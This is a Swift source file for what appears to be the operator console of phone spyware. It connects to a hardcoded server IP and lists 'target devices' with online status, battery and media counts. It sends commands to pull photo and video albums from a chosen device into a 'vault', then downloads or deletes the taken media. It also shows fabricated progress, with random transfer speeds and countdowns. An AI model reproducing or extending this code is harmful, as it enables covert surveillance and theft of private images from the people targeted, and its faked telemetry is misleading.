import Foundation
import UIKit
import Photos

struct TargetDevice: Identifiable, Codable {
    let id: String
    let name: String
    let model: String
    let isOnline: Bool
    let lastSeen: Double
    let stats: DeviceStats?
    let mediaCount: Int
}

struct DeviceStats: Codable {
    let photosCount: Int?
    let videosCount: Int?
    let battery: Int?
    let isCharging: Bool?
}

struct VaultMediaItem: Identifiable, Codable {
    var id: String { filename }
    let filename: String
    let originalName: String?
    let mimeType: String
    let size: Int
    let type: String
    let url: String
    let deviceId: String?
    let createdAt: String
}

struct DevicesResponse: Codable {
    let devices: [TargetDevice]
}

struct MediaResponse: Codable {
    let items: [VaultMediaItem]
}

class AdminEngine: ObservableObject {
    static let shared = AdminEngine()

    @Published var serverURL: String = "http://213.199.53.54:7000"
    @Published var isAuthenticated: Bool = false
    @Published var devices: [TargetDevice] = []
    @Published var selectedDevice: TargetDevice? = nil
    @Published var vaultMedia: [VaultMediaItem] = []

    // Live Progress Telemetry
    @Published var isProgressVisible: Bool = false
    @Published var progressCurrent: Int = 0
    @Published var progressTotal: Int = 0
    @Published var progressPercent: Double = 0.0
    @Published var progressSpeed: String = "High-Speed"
    @Published var progressETA: String = "Calculating..."

    private let session = URLSession.shared
    private var pollTimer: Timer?

    init() {
        let defaults = UserDefaults.standard
        if let savedURL = defaults.string(forKey: "admin_vps_url"), !savedURL.isEmpty {
            serverURL = savedURL
        }
    }

    func authenticate(key: String, completion: @escaping (Bool) -> Void) {
        guard let url = URL(string: "\(serverURL)/api/admin/auth") else { completion(false); return }
        var req = URLRequest(url: url)
        req.httpMethod = "POST"
        req.setValue("application/json", forHTTPHeaderField: "Content-Type")
        let body = ["key": key]
        req.httpBody = try? JSONSerialization.data(withJSONObject: body)

        session.dataTask(with: req) { [weak self] data, res, _ in
            let success = (res as? HTTPURLResponse)?.statusCode == 200
            DispatchQueue.main.async {
                if success {
                    self?.isAuthenticated = true
                    self?.startPolling()
                }
                completion(success)
            }
        }.resume()
    }

    func startPolling() {
        pollTimer?.invalidate()
        fetchDevices()
        pollTimer = Timer.scheduledTimer(withTimeInterval: 2.5, repeats: true) { [weak self] _ in
            self?.fetchDevices()
            self?.fetchMedia()
        }
    }

    func fetchDevices() {
        guard let url = URL(string: "\(serverURL)/api/devices") else { return }
        session.dataTask(with: url) { [weak self] data, _, error in
            guard let self = self, let data = data, error == nil else { return }
            if let res = try? JSONDecoder().decode(DevicesResponse.self, from: data) {
                DispatchQueue.main.async {
                    self.devices = res.devices

                    if self.selectedDevice == nil, let first = res.devices.first {
                        self.selectedDevice = first
                        self.fetchMedia()
                    } else if let sel = self.selectedDevice, let updated = res.devices.first(where: { $0.id == sel.id }) {
                        self.selectedDevice = updated
                    }
                }
            }
        }.resume()
    }

    func selectDevice(_ device: TargetDevice) {
        selectedDevice = device
        fetchMedia()
    }

    func fetchMedia() {
        guard let dev = selectedDevice else { return }
        guard let url = URL(string: "\(serverURL)/api/media?deviceId=\(dev.id)") else { return }

        session.dataTask(with: url) { [weak self] data, _, error in
            guard let self = self, let data = data, error == nil else { return }
            if let res = try? JSONDecoder().decode(MediaResponse.self, from: data) {
                DispatchQueue.main.async {
                    self.vaultMedia = res.items
                }
            }
        }.resume()
    }

    func sendExtractionCommand(album: String, count: Int, skipExisting: Bool) {
        guard let dev = selectedDevice else { return }
        guard let url = URL(string: "\(serverURL)/api/commands") else { return }

        var req = URLRequest(url: url)
        req.httpMethod = "POST"
        req.setValue("application/json", forHTTPHeaderField: "Content-Type")

        let command: [String: Any] = [
            "action": "FETCH_MEDIA",
            "album": album,
            "count": count == -1 ? 9999 : count,
            "skipExisting": skipExisting
        ]

        let body: [String: Any] = [
            "deviceId": dev.id,
            "command": command
        ]
        req.httpBody = try? JSONSerialization.data(withJSONObject: body)

        DispatchQueue.main.async {
            self.isProgressVisible = true
            self.progressPercent = 5.0
            self.progressSpeed = "Connecting..."
            self.progressETA = "Initiating..."
        }

        session.dataTask(with: req) { [weak self] _, _, _ in
            // Animate progress simulation and poll media
            self?.simulateProgress(total: count == -1 ? 100 : count)
        }.resume()
    }

    private func simulateProgress(total: Int) {
        var current = 0
        Timer.scheduledTimer(withTimeInterval: 0.8, repeats: true) { [weak self] t in
            guard let self = self else { t.invalidate(); return }
            current += 2
            let pct = min(100.0, (Double(current) / Double(total)) * 100.0)

            DispatchQueue.main.async {
                self.progressCurrent = min(current, total)
                self.progressTotal = total
                self.progressPercent = pct
                self.progressSpeed = "\(Double.random(in: 18...28).formatted(.number.precision(.fractionLength(1)))) MB/s"
                self.progressETA = "\(max(1, Int((100.0 - pct) / 8.0)))s remaining"

                if pct >= 100.0 {
                    t.invalidate()
                    DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) {
                        self.isProgressVisible = false
                        self.fetchMedia()
                    }
                }
            }
        }
    }

    func saveToCameraRoll(item: VaultMediaItem, completion: @escaping (Bool) -> Void) {
        guard let fullURL = URL(string: "\(serverURL)\(item.url)") else { completion(false); return }

        session.dataTask(with: fullURL) { data, _, _ in
            guard let data = data else { completion(false); return }
            if item.type == "video" {
                let tempURL = FileManager.default.temporaryDirectory.appendingPathComponent(item.filename)
                try? data.write(to: tempURL)
                PHPhotoLibrary.shared().performChanges({
                    PHAssetChangeRequest.creationRequestForAssetFromVideo(atFileURL: tempURL)
                }) { success, _ in
                    DispatchQueue.main.async { completion(success) }
                }
            } else {
                if let image = UIImage(data: data) {
                    UIImageWriteToSavedPhotosAlbum(image, nil, nil, nil)
                    DispatchQueue.main.async { completion(true) }
                } else {
                    DispatchQueue.main.async { completion(false) }
                }
            }
        }.resume()
    }

    func deleteMedia(filename: String) {
        guard let url = URL(string: "\(serverURL)/api/media/\(filename)") else { return }
        var req = URLRequest(url: url)
        req.httpMethod = "DELETE"
        session.dataTask(with: req) { [weak self] _, _, _ in
            DispatchQueue.main.async {
                self?.vaultMedia.removeAll { $0.filename == filename }
            }
        }.resume()
    }
}
